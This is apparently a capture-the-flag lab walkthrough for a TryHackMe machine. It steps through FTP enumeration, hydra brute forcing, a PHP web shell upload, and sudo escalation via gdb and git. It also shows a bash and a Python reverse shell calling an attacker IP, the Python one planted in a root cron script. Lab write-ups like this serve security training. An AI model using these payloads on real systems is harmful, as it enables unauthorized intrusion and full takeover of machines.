recon
- nmap
```
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```
- gobuster: nothing interesting, just robots.txgt

- robots.txt
```
User-Agent: *
Disallow : /admin-dir

I told d4rckh we should hide our things deep.
```
visite `/admin-dir` you will find 2 files. `userid` which contain username and `credentials.txt` which contain passwords. this can be useful for brute forcing.

- ftp: Anonymous
```
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ...
-rw-r--r--    1 ftp      ftp            17 Jul 05 21:45 test.txt
226 Directory send OK.
ftp> cd ...
250 Directory successfully changed.
ftp> ls -a
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 .
drwxr-xr-x    3 ftp      ftp          4096 Jul 05 21:31 ..
drwxr-xr-x    2 ftp      ftp          4096 Jul 05 21:31 ...
226 Directory send OK.
ftp> ls ...
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            14 Jul 05 21:45 yougotgoodeyes.txt
```
grab the file. it is containt a hidden web directory!!
```
kali@kali:~/THM/tartarus$ cat test.txt 
vsftpd test file
kali@kali:~/THM/tartarus$ cat yougotgoodeyes.txt 
/sUp3r-______
```
`/sUp3r-______` contains a login page. Let use hydra to brute force using `userid` and `credential.txt` as username and password
```
kali@kali:~/THM/tartarus$ hydra -t 64 -L userid -P credentials.txt $IP http-post-form "/sUp3r-s3cr3t/authenticate.php:username=^USER^&password=^PASS^:Incorrect"
```
user the credential obtained from hydra to log into `/sUp3r-s3cr3t/` note that you can upload files which will appreas at `/sUp3r-s3cr3t/images/uploads/`. I then try to upload a php srcipt which execute a os command base on a given argurment.
```php
<?php
echo "kurohat was herer\n"; system($_REQUEST['cmd']);
?>
```
now when I visite `sUp3r-s3cr3t/images/uploads/shell.php?cmd=whoami` it will return a output of `whoami`. I use it to do more recon on the server and grab user.txt.

after some recon with `whoami` and `ls /home` here is what I found
- /home: 3 directories
```
cleanup
d4rckh
thirtytwo
```
I then decided to spawn a reverse shell to make thing easy for me.
```http
GET /sUp3r-s3cr3t/images/uploads/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/10.11.14.220/6969+0>%261' HTTP/1.1
Host: 10.10.27.107
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.27.107/sUp3r-s3cr3t/images/uploads/
Connection: close
Cookie: PHPSESSID=7u6935nes7p327b4cgrpatqnng
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Content-Length: 0
```
I found a note for
```
www-data@ubuntu-xenial:/home$ cat thirtytwo/note.txt
cat thirtytwo/note.txt
Hey 32, the other day you were unable to clone my github repository. 
Now you can use git. Took a while to fix it but now its good :)

~D4rckh
```
more digging and I found that there is a cronjob running as root. We might be able to use it to gain root access.
```
www-data@ubuntu-xenial:/home$ cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
< /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"   

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

*/2 *   * * *   root    python /home/d4rckh/cleanup.py
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
cronjob is running as root, executing `/home/d4rckh/cleanup.py` which we dont have permission to write it since we still are a `www-data` user. I spawn tty shell so that I can runs more command:
```
www-data@ubuntu-xenial:/home/d4rckh$ python -c 'import pty;pty.spawn("/bin/bash");'
<e/d4rckh$ python -c 'import pty;pty.spawn("/bin/bash");'                    
www-data@ubuntu-xenial:/home/d4rckh$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu-xenial:
    (thirtytwo) NOPASSWD: /var/www/gdb
```
okey, seem like we can execute `/var/www/gdb` as `thirtytwo`. Check GTFObin for more infor
```
$ sudo -u thirtytwo /var/www/gdb -nx -ex '!sh' -ex quit # privesc shell as thirtytwo
```
as you can see, we are now `thirtytwo`
```
$ whoami
whoami
thirtytwo
$ sudo -l
sudo -l
Matching Defaults entries for thirtytwo on ubuntu-xenial:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User thirtytwo may run the following commands on ubuntu-xenial:
    (d4rckh) NOPASSWD: /usr/bin/git
```
okey same old story, check `git` on **GTFObins** to learn how to privesc using `git`
```
$ sudo -u d4rckh /usr/bin/git help config
sudo -u d4rckh /usr/bin/git help config
WARNING: terminal is not fully functional
-  (press RETURN)!/bin/bash
!/bin/bash
d4rckh@ubuntu-xenial:/var/www/html/sUp3r-s3cr3t/images/uploads$
```
now we are d4rckh!! as mentioned before, there is a corn job run as root which executing `cleanup.py`. Now let modify `cleanup.py` and make it spawn shell to our kali. Add the following python script to `cleanup.py`.
```py
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.11.14.220",9696));
os.dup2(s.fileno(),0); 
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```
BAM !! reverse shell should be up in 30 sec. grab root flag !!